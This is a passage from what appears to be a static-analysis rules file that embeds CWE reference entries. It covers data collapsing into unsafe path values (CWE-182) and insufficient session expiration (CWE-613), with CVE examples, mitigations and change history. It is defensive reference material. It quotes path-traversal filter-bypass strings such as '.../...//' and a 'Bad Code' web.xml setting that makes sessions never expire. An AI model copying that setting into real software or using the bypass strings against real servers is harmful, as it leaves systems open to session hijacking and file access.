&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0325" target="_blank"&gt;CVE-2002-0325&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;".../...//" collapsed to "..." due to removal of
"./" in web server.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0784" target="_blank"&gt;CVE-2002-0784&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;chain: HTTP server protects against ".." but
allows "." variants such as "////./../.../". If the server removes "/.."
sequences, the result would collapse into an unsafe value "////../"
(CWE-182).&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2169" target="_blank"&gt;CVE-2005-2169&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;MFV. Regular expression intended to protect
against directory traversal reduces ".../...//" to
"../".&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_182_Potential Mitigations" id="oc_182_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Avoid making decisions based on names of resources (e.g. files) if
those resources can have alternate names.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Assume all input is malicious. Use a standard input validation
mechanism to validate all input for length, type, syntax, and business
rules before accepting the data to be displayed or stored. Use an
"accept known good" validation strategy.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use and specify a strong output encoding (such as ISO 8859-1 or UTF
8).&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Do not rely exclusively on blacklist validation to detect malicious
input or to encode output. There are too many variants to encode a
character; you're likely to miss some variants.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Inputs should be decoded and canonicalized to the application's
current internal representation before being validated. Make sure that
your application does not decode the same input twice. Such errors could
be used to bypass whitelist schemes by introducing dangerous inputs
after they have been checked.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Canonicalize the name to match that of the file system's
representation of the name. This can sometimes be achieved with an
available API (e.g. in Win32 the GetFullPathName function).&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_182_Relationships" id="oc_182_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;171&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=171" target="_blank"&gt;Cleansing, Canonicalization, and Comparison Errors&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;693&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=693" target="_blank"&gt;Protection Mechanism Failure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;33&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=33" target="_blank"&gt;Path Traversal: '....' (Multiple Dot)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;34&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=34" target="_blank"&gt;Path Traversal: '....//'&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;35&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=35" target="_blank"&gt;Path Traversal: '.../...//'&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;CanFollow&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;185&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=185" target="_blank"&gt;Incorrect Regular Expression&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationship Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationship Notes&lt;/div&gt;&lt;div name="oc_182_Relationship Notes" id="oc_182_Relationship Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Overlaps regular expressions, although an implementation might not
necessarily use regexp's.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relevant Properties"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relevant Properties&lt;/div&gt;&lt;div name="oc_182_Relevant Properties" id="oc_182_Relevant Properties" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Trustability&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_182_Taxonomy Mappings" id="oc_182_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Collapse of Data into Unsafe Value&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_182_Content History" id="oc_182_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships, Relationship Notes,
Relevant Properties, Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Observed Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1648</key><name>Insufficient_Session_Expiration</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Insufficient Session Expiration&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;613&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_613_Description" id="oc_613_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;According to WASC, "Insufficient Session Expiration is when a
web site permits an attacker to reuse old session credentials or session IDs for
authorization."&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_613_Time of Introduction" id="oc_613_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_613_Demonstrative Examples" id="oc_613_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following snippet was taken from a J2EE web.xml deployment
descriptor in which the session-timeout parameter is explicitly defined (the
default value depends on the container). In this case the value is set to
-1, which means that a session will never expire.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;web-app&amp;gt;&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;[...snipped...]&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;session-config&amp;gt;&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;session-timeout&amp;gt;-1&amp;lt;/session-timeout&amp;gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&amp;lt;/session-config&amp;gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&amp;lt;/web-app&amp;gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_613_Potential Mitigations" id="oc_613_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Set sessions/credentials expiration date.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_613_Other Notes" id="oc_613_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The lack of proper session expiration may improve the likely success of
certain attacks. For example, an attacker may intercept a session ID,
possibly via a network sniffer or Cross-site Scripting attack. Although
short session expiration times do not help if a stolen token is immediately
used, they will protect against ongoing replaying of the session ID. In
another scenario, a user might access a web site from a shared computer
(such as at a library, Internet cafe, or open work environment).
Insufficient Session Expiration could allow an attacker to use the browser's
back button to access web pages previously accessed by the victim.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_613_Relationships" id="oc_613_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;361&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=361" target="_blank"&gt;Time and State&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;672&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=672" target="_blank"&gt;Operation on a Resource after Expiration or Release&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;724&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=724" target="_blank"&gt;OWASP Top Ten 2004 Category A3 - Broken Authentication and Session Management&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;287&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=287" target="_blank"&gt;Improper Authentication&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts&lt;/span&gt;699&lt;/span&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;RequiredBy&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Compound Element: Composite&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;352&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=352" target="_blank"&gt;Cross-Site Request Forgery (CSRF)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_613_Taxonomy Mappings" id="oc_613_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;47&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Insufficient Session Expiration &lt;/td&gt;&lt;/tr&gt;
